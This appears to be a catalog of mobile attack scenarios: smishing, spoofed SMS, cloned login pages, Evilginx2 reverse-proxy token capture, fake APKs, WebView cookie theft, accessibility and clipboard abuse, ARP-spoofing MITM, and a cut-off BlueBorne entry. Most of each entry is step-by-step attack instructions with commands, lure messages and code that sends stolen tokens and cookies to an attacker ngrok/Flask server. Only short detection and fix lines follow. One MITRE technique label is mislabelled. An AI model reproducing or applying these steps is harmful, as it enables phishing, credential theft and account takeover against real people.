Scenario Description: Attacker sends an SMS claiming a job offer or prize. The user clicks a link, submits personal data into a fake form, opening the door to identity theft or malware installation.
Tools Used: SMS Gateway (Twilio/Textbelt), PHP/Node.js fake form, Ngrok or free webhost
Attack Steps: 1. Host Fake Offer Page: Build a webpage with a form for “Name, Aadhar, Bank Details” or a “Download Offer” button. Host it via PHP/Node.js, expose through ngrok http 80, get the HTTPS URL. 2. Shorten the Link: Use bit.ly or tinyurl.com to disguise URL. 3. Compose SMS Template: Write: “Congrats! You’re selected for work-from-home job. Fill details: [shortlink]” or “Your reward is pending—tap to claim”. 4. Send SMS: Use Twilio or Textbelt to send the SMS to a test number. 5. Victim Clicks Link: Once received, user taps link and lands on your fake page. 6. Harvest Data: They enter sensitive info (e.g., personal id), which is collected via your server’s POST handler. 7. Monitor & Log Data: Your backend logs and can email or store the data. 8. No Malware Required: The scam relies purely on tricking user into revealing personal details.
Impact: Identity theft, financial loss, data harvesting
Detection Method: Analyze network traffic; detect shortlinks in SMS
Solution: Educate users to verify job sources; block known phishing domains
Tags: smishing, job scam, identity theft, sms link, phishing

Title: SMS with Contact Spoofing
Scenario Description: Attacker spoofs a trusted number (e.g., bank or friend) and sends SMS with a malicious link, increasing trust and click-through rate.
Tools Used: SMPP server or SpoofMe tools, link host and shortener, Ngrok or hosting
Attack Steps: 1. Set Up Spoofing Method: Use a spoofing service or SMPP tester to send SMS appearing from “+BankName” or a contact saved in the victim’s phone. 2. Host Phishing or Malware Page: Same as prior methods—fake page or payload link via hosting and ngrok. 3. Shorten Link: Obfuscate with bit.ly. 4. Craft Trustworthy Message: “BankAlert: OTP needed. Click [shortlink]” or “Hi John, urgent message: [shortlink]” using known alias. 5. Send Spoofed SMS: Dispatch SMS using the spoofing setup to victim’s number. 6. Victim Receives from “Known” Sender: The phone displays it as from a real contact or company. 7. Click Happens: Victim opens link, landing on fake portal or installing malicious file. 8. Either Info or Malware Delivered: You capture credentials or install payload.
Vulnerability: Trust abuse via contact identity misrepresentation
Detection Method: Compare SMS phone number to actual sender, use spoof protection tools
Solution: Deploy SMS anti-spoofing in telco; user caution; block spoofed numbers
Tags: smishing, spoofing, sms trust, phishing, malware, identity spoof

Title: Link to Browser Exploit / WebView Injection
Scenario Description: Attacker sends an SMS link that opens in the phone's WebView or browser and triggers a known exploit (e.g., outdated WebView CVE) or injected malicious JavaScript to steal cookies, credentials, or escalate privileges.
Tools Used: Hosted exploit code with JS payload, CVE-based WebView exploit, Ngrok/HTTPS hosting
Attack Steps: 1. Build Exploit Page: Write HTML/JS exploiting a known WebView bug (e.g., file:// sandbox bypass or JS-based keylogging). Host it via ngrok http 80. 2. Shorten URL: Use tinyurl.com to mask. 3. Compose SMS Lure: “Your invoice is ready. Click to view: [shortlink]” or “Important security alert—open now”. 4. Send SMS: Use SMS gateway or Twilio to send to target. 5. Victim Opens Link: SMS shows link; victim taps and it opens in default WebView/browser. 6. Exploit Executes: JS runs automatically, steals cookies or credentials, or exploits WebView to escape sandbox. 7. Data Exfiltrated to Attacker: JS sends stolen data via AJAX POST to your server. 8. Confirm via Logs: You check server logs, confirming payload ran and exfiltration occurred.
Impact: Full credential theft, session hijacking, malware drop
Detection Method: Monitor HTTP traffic; look for unusual POSTs from device; use endpoint security
Solution: Keep WebView and OS updated; use CSP, disable JS where unnecessary; employ browser sandboxing
Tags: smishing, webview exploit, browser attack, js injection, payload link

Title: QR Code Delivery via SMS
Scenario Description: Attacker sends an SMS containing a malicious QR code image that leads to a phishing site or a malware APK. Victim scans it thinking it's a job offer, reward, or verification step, unknowingly launching the exploit.
Tools Used: QR code generator (qr-code-generator.com), phishing/malware hosting (e.g., GitHub Pages, Ngrok), SMS service (Twilio, Textbelt)
Attack Steps: 1. Create Phishing or Malware Page: Set up a fake webpage (e.g., job form, bank login) or host a malicious APK via GitHub Pages, Ngrok, or local server. 2. Generate the QR Code: Go to qr-code-generator.com or use a tool like qrencode to generate a QR code pointing to your phishing/malware URL. Example: qrencode -o qr.png 'https://malicious.site/fakejob'. 3. Host the QR Image: Upload qr.png to a file-sharing platform (imgbb, imgur) or directly embed it into the SMS if supported. 4. Compose the SMS: Write a message like “Dear user, scan this code to complete your job application/reward claim” and include a direct link to the QR code image or embed the image if your SMS gateway supports MMS. 5. Send the SMS: Use Twilio, Textbelt, or any bulk SMS sender to dispatch the message to a test device. 6. Victim Scans QR: The user scans the code using their mobile camera. It opens the malicious URL in their browser or prompts APK download. 7. Exploit/Phish Happens: User either enters credentials into a fake form or downloads and installs the malicious APK. 8. Capture Results: If phishing, credentials are sent to your backend. If APK, it connects back to your listener (e.g., msfconsole handler). 9. Clean-Up: Delete QR code image, logs, and shut down the listener after simulation.
Vulnerability: Human trust in QR codes and poor SMS link filtering
Impact: Identity theft, malware infection, credential theft
Detection Method: QR code scanners with link previews; web filtering logs
Solution: Warn users not to scan unknown QR codes; disable MMS auto-open; security awareness
Tags: qr smishing, phishing, malware, android apk, qr image spoof

Title: Zero-Click Malicious Short Links (URL Cloaking)
Scenario Description: A zero-click SMS includes a disguised short link that auto-previews in the victim's notification or opens silently in certain browsers. The cloaked link redirects to a malware download or auto-submitting phishing form without requiring a tap.
Tools Used: URL shortener (bit.ly, TinyURL), malicious URL (ngrok, GitHub), SMS Gateway, Mobile test device
Attack Steps: 1. Prepare the Malicious Site: Host a phishing page or APK download on Ngrok or free hosting like Netlify/GitHub Pages. Use HTTPS to avoid warnings. 2. Obfuscate and Chain Redirects: Use a URL shortener (e.g., tinyurl.com) to shorten the malicious URL. Then, chain it by re-shortening the already-shortened link using another service (e.g., tiny.cc or is.gd) to make the target unrecognizable. 3. Craft SMS with Cloaked Link: Compose a message like: “Verification complete. Details: [multi-shortened URL]” — keep it vague and seemingly routine. 4. Send SMS: Use Textbelt, Twilio, or Fast2SMS to send the message to the victim. 5. Zero-Click Preview Attack (Optional): On Android versions with URL preview in notifications or auto-opening browsers, the device may partially render or prefetch the content—this is where the JS payload or malicious redirect can trigger silently. 6. User Tap (Fallback): If not auto-executed, most victims will still tap it out of curiosity. The link opens to malware or a fake login page. 7. Capture or Install: If it's phishing, log the credentials via your backend. If it’s a payload, ensure your APK connects back to Metasploit (msfconsole -x ...). 8. Analysis: Use browser user-agent headers to filter traffic logs for successful hits.
Vulnerability: No user tap needed due to browser preview / silent fetch
Impact: Device infection, phishing success without explicit click
Detection Method: Network proxies, HTTP headers, prefetch behavior logs
Solution: Disable URL previews in SMS, educate users on cloaked links, monitor shortlink chains
Tags: zero-click, cloaked link, drive-by, smishing, url obfuscation

Title: Fake Login Pages (Mobile Web)
Scenario Description: A phishing site is disguised to look like a real mobile app’s login page (e.g., Facebook, Google). When opened on a phone, it mimics the mobile UI perfectly and tricks users into entering credentials.
Tools Used: HTML/CSS (for fake login page), Ngrok (for HTTPS), bit.ly (for URL masking), free web hosting (e.g., GitHub Pages)
Attack Steps: 1. Design a Fake Login Page: Use HTML/CSS to mimic the login page of a real service (e.g., Facebook). Ensure it’s mobile-responsive using CSS media queries and viewport meta tag. 2. Add Credential Capture Logic: In the form’s submit action, add a PHP or Node.js handler that logs input to a text file or emails it to you. Example: action="stealer.php" where stealer.php saves inputs. 3. Host the Page: Deploy it using GitHub Pages, Netlify, or Ngrok (ngrok http 80) to get an HTTPS link. 4. Mask the URL: Use bit.ly to shorten the Ngrok/hosted URL, giving it a harmless appearance. 5. Test on Your Mobile: Open the short URL on an Android/iOS device to check if it looks like the real app. 6. Distribute Link: Send the shortened link via SMS, WhatsApp, Telegram, or social media disguised as “security alert” or “login error correction”. 7. Victim Opens Page: The user thinks it’s the actual app in the browser. 8. Victim Enters Credentials: When submitted, credentials are silently logged. 9. Optional Redirect: After submission, redirect victim to the real site to avoid suspicion using header('Location: https://originalsite.com').
Vulnerability: Lack of visual SSL verification + Mobile UI mimicry
Impact: Account takeover, identity theft, credential harvesting
Detection Method: Monitor traffic to phishing domains; use browser protection tools
Solution: Implement MFA, educate users, detect cloned UIs, URL filtering
Tags: phishing, fake login, mobile, html clone, credential harvest

Title: Phishing via Deep Links or App Links
Scenario Description: Malicious links appear to deep-link to a legitimate app but instead open a browser-based phishing page mimicking the app’s screen. Users trust the deep link preview and get phished.
Tools Used: Intent URI / App Link crafting, Ngrok or Netlify hosting, HTML/CSS phishing UI
Attack Steps: 1. Craft Deep Link Looking URL: Create a URL like https://example.com/app/deeplink?id=login that appears to be an app deeplink. 2. Design Phishing Page: Host a mobile-friendly clone of the app login screen using HTML/CSS. Add a credential logger backend (PHP/Node). 3. Shorten and Obfuscate: Use URL shorteners to make the malicious deep link look less suspicious. 4. Trigger Auto-Open in Browser: If the app isn’t installed or misconfigured, Android will fallback to browser, loading the phishing page. 5. Send Message: “Tap to view your bill / reset password: [link]” via email/SMS/social apps. 6. Victim Clicks Link: If app not installed or deep link misfires, phishing page opens. 7. Victim Logs In: Data gets stolen silently via stealer.php. 8. Redirect to Real App: You can redirect user to the Play Store or original app to mask the phishing attempt.
Vulnerability: Misused deep links or App Links fallback
Impact: Credential theft, loss of trust in app brand
Detection Method: Monitor deep link behavior; inspect web referrers
Solution: Restrict unverified app links; validate intent filters; enforce verified hosts
Tags: deep link phishing, app link abuse, fake login, browser fallback

Title: Fake Apps with Lookalike UI
Scenario Description: Attacker creates an app that perfectly mimics a real banking, social, or payment app's UI. Victim installs it from a third-party store, thinking it’s real, and enters login info which gets stolen.
Tools Used: Android Studio, ApkTool, real app screenshots, smali editor, keylogger code
Attack Steps: 1. Analyze Target App: Install the real app, take screenshots of login, OTP, and other key screens. 2. Create Lookalike UI: Use Android Studio to recreate the login UI with exact colors, icons, and fields. 3. Add Stealing Logic: Capture input from EditText fields and log/send them to your server or save locally. Example: username = editText.getText().toString(); then send via HttpPost. 4. Build the APK: Generate signed APK and optionally obfuscate with ProGuard. 5. Distribute APK: Upload to fake websites, shady app stores, or send directly via WhatsApp/Telegram with messages like “Install SBI Secure Lite app v2.1”. 6. Victim Installs App: Since the app mimics original, victim trusts it and enters login info. 7. Credentials Stolen: App silently exfiltrates data on submit. 8. Optional Add-on: Include overlays that block user from opening the real app or display fake errors to prolong attack.
Impact: Data theft, financial fraud, session hijacking
Detection Method: App store scanning, signature mismatch, malware sandbox
Solution: Use Play Protect, block installs from unknown sources, user education
Tags: fake app, android, phishing ui, credential theft, smishing app

Title: Google Ads + Typosquatting Domains
Scenario Description: Attacker buys domains that mimic popular brands (like g00gle.com or faceb00k.com) and sets up AdWords campaigns targeting mobile users, directing them to phishing webpages. The URLs look legitimate due to typosquatting and mobile viewport masking.
Tools Used: Google Ads account, domain registrar (Namecheap), hosting (Netlify/Ngrok), SSL certificate, HTML/CSS phishing template
Attack Steps: 1. Register Typosquatting Domain: Choose a domain that closely resembles a real service (e.g., “g00gle-secure.com”) and purchase it. 2. Set Up Hosting: Host a cloned login page on your domain using GitHub Pages, Netlify, or a server via ngrok http 80. 3. Install SSL: Add a free SSL certificate via Let's Encrypt or Netlify default HTTPS to prevent browser warnings. 4. Launch Google Ads Campaign: Create an ad with mobile-targeted keywords like “Google login mobile” using the registered domain as the landing page. 5. Design Phishing Page: Make a smartphone-responsive HTML/CSS page that mimics the real login screen, capturing credentials through a POST request to your backend. 6. Shorten & Promote Link: Use a URL shortener (e.g., bit.ly) in the ad if the platform allows, further masking the typosquatted domain. 7. User Clicks Ad: Victims searching on mobile click the ad, see no immediate warning, and land on your fake login page. 8. Harvest Credentials: As users enter data, it’s recorded by your backend script in real time. 9. Redirect to Real Site: After submission, automatically redirect victims to the legitimate site to avoid suspicion and cover your tracks.
Vulnerability: Trust in paid ads and domain similarity
Detection Method: Monitor for typosquatting domains, use ad keywords filtering
Solution: Enforce domain whitelisting in ad reviews, educate users to check URLs
Tags: phishing, typosquatting, google ads, mobile, fake login

Title: Mobile Browser In‑App Phishing (WebView Injection)
Scenario Description: A malicious mobile app opens a legitimate site in a WebView, injects JavaScript to display a fake login overlay, and captures credentials before passing users through to the real site.
Tools Used: Android Studio, Java/Kotlin, WebView, JavaScript injection, HTTPS server for credentials backend
Attack Steps: 1. Create Malicious Android App: In Android Studio, build a WebView app that loads a legitimate URL (e.g., https://bank.com/login) along with INTERNET permission. 2. Enable JavaScript: In onCreate, initialize WebView with webView.getSettings().setJavaScriptEnabled(true);. 3. Inject Fake Overlay: Use addJavascriptInterface or onPageFinished to inject custom JS into the page that hides the real form and adds a fake one for credentials. Example JS: document.body.innerHTML = '<form>...’;. 4. Capture Input: When user enters credentials in the fake form, JavaScript sends them back via the bridge interface (Interface.submit(login, pass)) to Android code. 5. Log or Forward Data: In the Android interface code, receive the credentials and log them or send them via HTTPS to your server. 6. Load Real Page (Optional): After capturing credentials, redirect WebView back to the original bank login to avoid suspicion. 7. Package & Sign APK: Build the APK and sign it (optionally obfuscate for realism). 8. Distribute App: Provide the app on a third-party site, sample community forums, or sideload via social platforms. 9. Victim Installs & Logs In: The victim uses the app thinking it’s safe; enters credentials in fake overlay, which are stolen silently.
Detection Method: Detect JS injection patterns, monitor WebView usage logs
Solution: Use captive WebViews for authentication, verify URL authenticity, use token-based auth
Tags: webview phishing, js injection, mobile app, fake ui

Title: Fake Mobile Security Apps
Scenario Description: Attacker creates a counterfeit security or antivirus app with a convincing UI. The app requests login credentials or ransom permissions while pretending to scan the device.
Tools Used: Android Studio, UI mockups from real security apps, smali/backdoor code, APK signing tools
Attack Steps: 1. Analyze Real Security App UI: Take screenshots of legitimate antivirus or security apps (e.g., McAfee Lite). Note layout, fonts, button placements. 2. Recreate UI in Android Studio: Use LinearLayout and ImageViews to build an identical-looking APK. Include screens like "Login to Secure", "Scan in Progress" with progress animation. 3. Add Credential Capture: On "Login", capture username/password fields and send them via HTTP POST to your malicious server in the background. 4. Implement Fake Scans: Add Timer or background thread to simulate a 5-second "Virus scan" completing with "Threats found" message. 5. Ask for Elevated Permissions: After scan, prompt user to grant "Clear all threats" which requests SMS or Accessibility permissions. If granted, log or misuse them. 6. Build and Sign APK: Compile the APK, sign with a debug keystore, optionally obfuscate classes. 7. Distribute via Side Channels: Offer the app through forums, social media ads (“Download Secure Antivirus 2.0”), or mimic packaging via QR link. 8. Victim Installs and Logs In: User trusts the UI, provides login details which are exfiltrated; permissions grant full device access.
Vulnerability: Trust in security-branded UI + permission abuse
Impact: Credential theft, device takeover, permission misuse
Detection Method: App signature verification, antivirus scans, user reviews
Solution: Use official store only, verify app publishers, review permissions carefully
Tags: fake antivirus, mobile phishing, ui mimic, android malware

Title: Fake OAuth / Google-Facebook Login Prompts
Scenario Description: An attacker builds a mobile webpage or app UI that mimics the Google or Facebook OAuth login window. This fake prompt appears in a WebView or popup and tricks the user into entering their account credentials, which are then captured.
Tools Used: HTML/CSS (Google/Facebook clone), JS credential capture, Android Studio (optional), Ngrok/Netlify
Attack Steps: 1. Clone the OAuth Prompt: Use browser dev tools to capture the HTML/CSS of Google's or Facebook's OAuth window (login popup). Recreate it in your HTML page using accurate logos, buttons, font, and styling for realism. 2. Implement Credential Capture Logic: Replace the form’s action with your custom PHP/Node backend (stealer.php) that saves entered credentials. Make sure the form fields (email, password) match original names. 3. Host the Fake Page: Upload the phishing page to GitHub Pages or use a local server and expose it using ngrok http 80 to get an HTTPS URL. 4. Make it Mobile-Friendly: Add viewport meta tags and CSS media queries to ensure the popup renders correctly on mobile screens. 5. Disguise URL: Shorten your Ngrok link using Bitly to hide the domain origin. 6. Send the Link to Victims: Use messages such as “Session Expired – Re-login Required” via SMS, WhatsApp, or inside fake mobile apps. 7. Present it as Popup or WebView: If using an app, create a WebView activity that loads this phishing URL, looking like a real login dialog. 8. User Enters Credentials: Victim enters their Google/Facebook login assuming it’s real. Backend stores the credentials. 9. Redirect to Legitimate Site: After stealing credentials, redirect user to the real login page or home page (window.location.href = "https://accounts.google.com";) to avoid suspicion.
Vulnerability: Visual spoofing + reliance on brand trust
Impact: Full account takeover (email, cloud, social), identity theft
Detection Method: OAuth telemetry mismatch, behavioral anomalies
Solution: Enforce SSO domain validation, implement device-based trust
Tags: oauth phishing, login clone, fake facebook, fake google, webview spoof

Title: QR Code Phishing on Mobile
Scenario Description: A malicious QR code is created to redirect users to a phishing page mimicking a banking or service login. When scanned on mobile, the page appears like the official mobile login screen, tricking the user into giving up credentials.
Tools Used: QR Code Generator, HTML phishing page, Ngrok/Netlify, Credential logger (PHP)
Attack Steps: 1. Create the Phishing Page: Clone the mobile login UI of a target service (like a bank) using HTML/CSS. Add form inputs and redirect behavior. 2. Implement Logging Backend: Add a backend (stealer.php) that stores user credentials into a text file or sends it to your email. 3. Host the Page: Use GitHub Pages or expose with Ngrok to get a public HTTPS link. Example: https://a1b2c3.ngrok.io/login. 4. Generate the QR Code: Use any free QR generator (e.g., qrstuff.com) and generate a QR linking to your hosted phishing page. Download the QR code as PNG. 5. Print or Distribute the QR: Place QR on posters, flyers, fake offers, parking meters, or social media banners with messages like “Scan to get 50% off” or “COVID Check-in QR”. 6. User Scans with Mobile Camera: The browser automatically opens the phishing link. 7. Fake Page Loads on Mobile: Due to mobile-friendly styling, victim believes it’s the official login screen. 8. User Enters Details: Credentials are posted to your backend and logged silently. 9. Redirect to Real Site: Use JS to redirect user to the actual website (window.location.href = "https://realbank.com";) after submission.
Vulnerability: Blind trust in QR codes + mobile UI mimicry
Impact: Credential leakage, session hijack, monetary theft
Detection Method: Monitor QR traffic redirects, implement QR security scanners
Solution: Educate users, validate QR sources, preview QR destination before visiting
Tags: qr phishing, mobile scam, fake login, html clone

Title: Evilginx2 – Reverse Proxy Phishing (Token Capture)
Attack Type: Session Hijacking (Token Theft via Mobile Phishing)
Scenario Description: The attacker sets up a phishing site using Evilginx2 that acts as a reverse proxy, capturing authentication tokens (session cookies) when the victim logs into a legitimate site through a fake link. This allows the attacker to hijack the victim’s session without needing their username or password.
Tools Used: Evilginx2, Nginx, Domain (e.g., GoDaddy), Cloudflare (optional), Android Device
Attack Steps: 1. Set up a VPS (DigitalOcean or Linode) and install Ubuntu 20.04. 2. Update packages: sudo apt update && sudo apt upgrade -y. 3. Install dependencies: sudo apt install git make gcc and go from Golang official site. 4. Clone Evilginx2: git clone https://github.com/kgretzky/evilginx2.git 5. Build Evilginx2: cd evilginx2 && make. 6. Setup DNS: Buy a domain and create A record pointing to your VPS IP (e.g., login-google.com). 7. Start Evilginx2: Run ./bin/evilginx. 8. Create phishing site config: config phishing_site using Evilginx2 syntax for target (e.g., Google, Facebook). Evilginx2 already has templates for many. 9. Enable phishing site: phishlets enable google and phishlets hostname google login-google.com. 10. Run HTTP(S) listener: ip and listen 80 443. 11. Craft phishing link: Evilginx2 gives you a phishing URL like https://login-google.com. 12. Send phishing SMS/email: Craft message like "Security Alert: Verify your Google login: https://login-google.com". 13. User logs in via phishing link: Evilginx2 transparently proxies login and captures session token. 14. Steal session cookie: Go to sessions in Evilginx2 and extract Authorization or SESSIONID cookie. 15. Use cookie in browser: Open Chrome, go to target site (e.g., google.com), open DevTools → Application → Cookies → Add stolen session cookie manually. 16. Access victim’s session without username/password.
Vulnerability: Lack of anti-phishing detection, token reuse
Detection Method: Monitor unknown domain logins, session anomalies
Solution: Implement token binding, re-authentication for sensitive actions

Title: Fake App with Token Forwarding
Attack Type: Session Hijacking (Token Theft via Mobile Phishing)
Scenario Description: The attacker develops a malicious Android app that mimics a legitimate app. When the victim logs in, the app forwards their authentication token (e.g., JWT or session ID) to the attacker's server, allowing silent session hijacking.
Tools Used: Android Studio, Java/Kotlin, ngrok or Flask server, ApkTool
Attack Steps: 1. Set up development: Install Android Studio. Create a new app that mimics the login screen of a real app (e.g., Instagram). Use official app assets for UI clone. 2. Add token capture code: In LoginActivity.java, after user clicks login, intercept request and extract token from response headers (use OkHttpClient or Volley). 3. Forward token to attacker: Add code to send token via HTTP POST to your attacker-controlled server. Example: POST http://<attacker-ngrok>/token with token in JSON body. 4. Set up receiving server: Create Flask app: from flask import request @app.route('/token', methods=['POST']) print(request.json) 5. Run server using ngrok: ngrok http 5000 to get public URL. 6. Compile and sign APK: Generate keystore and sign the APK using Android Studio tools. 7. Distribute fake app: Send APK via phishing SMS/email or upload on shady APK sites. Use text like: "New Instagram Update! APK: [link]". 8. User installs app and logs in: Victim uses fake app UI and enters credentials. App logs in silently and extracts session token. 9. Token sent to attacker server: The attacker now sees the victim’s JWT/session token in logs. 10. Replay token in browser: Use a proxy like Burp or browser cookie editor to inject session token and hijack session. 11. Access account without credentials: If the server doesn't bind token to device/IP, attacker gains full access.
Vulnerability: Insecure token handling, fake apps, poor validation
MITRE Technique: T1636 – Boot or Logon Autostart Execution
Detection Method: Token reuse across IP/device, token anomalies
Solution: Enforce token binding, app verification, Play Protect

Title: Intercept WebView Cookies
Attack Type: Session Hijacking (Token Theft via Mobile Phishing)
Scenario Description: The attacker builds an Android app using a WebView to render a legitimate site. They enable JavaScript and cookie access, then extract and forward session cookies to the attacker's server without user awareness.
Tools Used: Android Studio, WebView, Java/Kotlin, Flask, ngrok
Attack Steps: 1. Create Android WebView App: In Android Studio, create a blank app and add a WebView in the layout. Set the WebView to load https://example.com (e.g., Instagram, Facebook). 2. Enable JavaScript: In onCreate, use: webView.getSettings().setJavaScriptEnabled(true); 3. Enable cookie access: Use CookieManager.getInstance().setAcceptCookie(true) and CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);. 4. Extract cookies after page load: Add a WebViewClient with onPageFinished() method. Inside it, use: String cookies = CookieManager.getInstance().getCookie(url); 5. Forward cookies to attacker: Use HttpURLConnection or OkHttp to send cookies to your server (Flask or PHP). Example: POST http://<ngrok>/logcookie with cookies in body. 6. Set up Flask receiver: Simple Flask app: @app.route('/logcookie', methods=['POST']) print(request.data) 7. Run server with ngrok: ngrok http 5000 to expose public endpoint. 8. Build and sign APK: Sign and compile the APK, optionally obfuscate. 9. Distribute the APK: Through third-party stores, phishing emails, Telegram groups. Use titles like “Lite Instagram App”. 10. User installs and uses app: Victim logs into target site through WebView. 11. Cookie extraction succeeds silently: App logs session cookie and sends to attacker. 12. Replay cookie: Use Chrome with EditThisCookie to set session cookie and access victim’s session.
Vulnerability: Cookie access from WebView, insecure implementation
Detection Method: Check for suspicious app packages with WebView abuse
Solution: Restrict WebView cookies, use secure flags, enforce device binding

Title: Social Login Hijack (OAuth Token Theft)
Attack Type: Session Hijacking (Token Theft via Mobile Phishing)
Scenario Description: The attacker abuses OAuth "Login with Google/Facebook" in a malicious app to intercept and forward OAuth tokens returned during the login process. Once the OAuth access token is obtained, it can be used to impersonate the victim on third-party services.
Tools Used: Android Studio, OAuth Playground, HTTP Debugger, MITMProxy, Malicious App
Attack Steps: 1. Set up Android project in Android Studio: Create a fake app that includes a Google/Facebook login button using the standard SDK. 2. Integrate Social Login SDK: Use GoogleSignInOptions or Facebook's SDK normally, but register your fake app with a real OAuth client (e.g., from Google Cloud). 3. Handle the login result in onActivityResult(): Extract the idToken or accessToken. Example: String token = account.getIdToken();. 4. Forward token to attacker server: Use HttpURLConnection or Retrofit to POST the token to http://<attacker-server>/token. 5. Create attacker server with Flask: @app.route('/token', methods=['POST']) print(request.json) 6. Run attacker server on ngrok: ngrok http 5000. 7. Compile and sign APK: Sign the app and optionally obfuscate with ProGuard. 8. Distribute app via social media, fake promotions (e.g., "Log in to get free coins"). 9. User logs in: OAuth provider sends token. App captures and silently forwards token. 10. Attacker uses token on OAuth Playground or via API calls. For Google: curl https://www.googleapis.com/oauth2/v1/userinfo?access_token=<TOKEN> 11. Attacker accesses victim account on third-party services using token impersonation.
Vulnerability: Insecure OAuth token handling, app impersonation
Impact: Identity theft, impersonation on third-party services
Detection Method: Monitor token replay, unexpected OAuth client usage
Solution: Enforce token binding, strong client ID verification

Title: Malicious Accessibility Service (Session Token View)
Attack Type: Session Hijacking (Token Theft via Mobile Phishing)
Scenario Description: An attacker builds a malicious app with an Accessibility Service that monitors screen content in real-time. When the victim opens a target app (e.g., email or social media), the service extracts session tokens, OTPs, or login confirmations from the screen, enabling unauthorized access.
Tools Used: Android Studio, AccessibilityService API, Java, Flask, ngrok
Attack Steps: 1. Create Android app in Android Studio with AccessibilityService declared in AndroidManifest.xml. Use: <service android:name=".MyAccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"> 2. Add required accessibility config: Create XML accessibility_service_config.xml with android:accessibilityEventTypes="typeAllMask" and packageNames="com.target.app". 3. Enable screen reading: Override onAccessibilityEvent() to extract text from all nodes. Use event.getText().toString() and event.getSource().getText(). 4. Look for keywords like "session", "token", or regex for JWT patterns. 5. Forward data to attacker: Use HttpURLConnection to POST data to attacker's server at http://<ngrok>/steal. 6. Set up Flask server: @app.route('/steal', methods=['POST']) print(request.json) 7. Run Flask + ngrok to get public endpoint. 8. Sign and compile APK, distribute via messaging apps or third-party stores. 9. Victim installs app and enables AccessibilityService under Settings (prompted by app). 10. Victim opens legitimate app (e.g., banking, email, etc.). 11. Malicious service intercepts session-related data from screen and sends to attacker. 12. Attacker uses data to hijack session, reset password, or perform account actions.
Impact: Unauthorized access to accounts, sensitive data theft
Detection Method: Monitor abnormal Accessibility usage, app behavior
Solution: Restrict accessibility permissions, enforce Play Protect

Title: Clipboard Token Stealing (On Rooted Devices)
Attack Type: Session Hijacking (Token Theft via Mobile Phishing)
Scenario Description: The attacker targets rooted Android users by deploying a malicious app that monitors clipboard contents. When a token (like JWT, session key, or reset URL) is copied, the app logs and forwards it, allowing session hijack or account takeover.
Tools Used: Android Studio, ClipboardManager API, Flask, ngrok, Rooted Android Device
Attack Steps: 1. Create Android app in Android Studio with permission <uses-permission android:name="android.permission.READ_CLIPBOARD"/> (works only on rooted/custom ROM devices or SDK < 29). 2. Set up clipboard listener: Use ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE); 3. Register a listener with clipboard.addPrimaryClipChangedListener(). 4. Inside listener, extract clipboard contents using clipboard.getPrimaryClip().getItemAt(0).getText(). 5. Check if clipboard content matches token pattern using regex (Bearer, eyJ..., or session URLs). 6. Send token to attacker server using HttpURLConnection or Retrofit. 7. Create Flask server: @app.route('/clip', methods=['POST']) print(request.data) 8. Expose server via ngrok: ngrok http 5000. 9. Compile and sign APK, disguise it as utility app (e.g., clipboard manager, memory booster). 10. Distribute APK to rooted phone users via forums, mod sites, or Telegram. 11. Victim copies a token from their email or app during login or reset process. 12. App intercepts clipboard content and forwards token silently. 13. Attacker uses token for session hijack in browser or REST APIs.
Detection Method: Analyze clipboard activity, clipboard manager logs
Solution: Restrict clipboard access, token expiry, root detection
Source: Custom test on rooted emulator + Android Studio

Title: Token Logging via Network Intercept (MITM)
Attack Type: Session Hijacking (Token Theft via Mobile Phishing)
Scenario Description: The attacker performs a Man-in-the-Middle (MITM) attack by intercepting unencrypted or weakly encrypted HTTP/HTTPS traffic from a victim's mobile device. When the victim logs into a web service using mobile data or public Wi-Fi, the attacker captures session tokens from headers or cookies, which can then be replayed to hijack the session.
Tools Used: Wireshark, Bettercap, SSLStrip, Kali Linux, Android Device (victim), Public Wi-Fi, Burp Suite, Root CA Certificate
Attack Steps: 1. Set up attacker laptop or VM: Install Kali Linux or Parrot OS. Ensure network adapter is set to NAT or bridged so you can interact with the victim's traffic. 2. Enable IP forwarding: Open terminal and run echo 1 > /proc/sys/net/ipv4/ip_forward. This allows your machine to forward packets as a router. 3. Use Bettercap for MITM: Run bettercap -iface wlan0 (replace wlan0 with your network interface). 4. Enable ARP spoofing: Inside Bettercap interactive shell, run: net.probe on set arp.spoof.targets <victim IP> arp.spoof on. This poisons the ARP table of victim, making attacker the gateway. 5. Enable HTTPS downgrade (optional) using http.proxy and https.proxy.sslstrip modules if victim app doesn't enforce HSTS. Run: set http.proxy.sslstrip true http.proxy on. 6. Install Burp Suite and set up proxy: In Burp, go to Proxy tab → Options → set to port 8080. Enable Intercept. 7. Install Burp's root CA on victim phone: Open phone browser and navigate to http://burp. Download and install CA certificate. Enable "Trust User Certificates" in developer options. Note: This works only on rooted Android or systems where user CA is honored. 8. Configure victim device to use your proxy: On victim phone, go to Wi-Fi settings → modify network → manual proxy → enter attacker IP and port 8080. 9. Launch Burp, capture login traffic: Victim opens a mobile browser or insecure app (that uses HTTP or weak HTTPS). When user logs in, session tokens appear in Cookie or Authorization headers. 10. Go to Burp → HTTP History tab: Click on each captured request. Identify session-related headers like Authorization: Bearer, session=, X-Auth-Token, etc. 11. Copy session token. Open Chrome on your system → go to target site → open DevTools → Application → Cookies → paste the stolen token. 12. Refresh the page → You're now logged in as the victim without username/password. 13. Alternatively, if app uses a token in URL (e.g., password reset, magic login), capture and replay entire URL.
Target Type: Android Device on Wi-Fi or Mobile Browser
Vulnerability: Lack of certificate pinning, unencrypted or weakly encrypted traffic, weak session control
Impact: Full session hijack, identity theft, unauthorized access
Detection Method: Monitor for strange IP sessions, duplicate tokens, public Wi-Fi session spikes
Solution: Enforce HSTS, TLS 1.3, certificate pinning, token binding, VPNs

Title: BlueBorne RCE Attack (CVE-2017-0785 and others)
Scenario Description: An attacker exploits vulnerabilities in the Bluetooth stack (e.g., in Android's Bluetooth implementation, BlueZ on Linux) to perform Remote Code Execution (RCE) without user interaction. The victim only needs Bluetooth enabled and to be within range—no need to pair, click, or connect. This allows silent takeover of the device.
Tools Used: Linux OS (Kali), BlueBorne Proof-of-Concept, Python, Android device (unpatched), bdaddr tool, Bluetooth Adapter, GitHub PoC
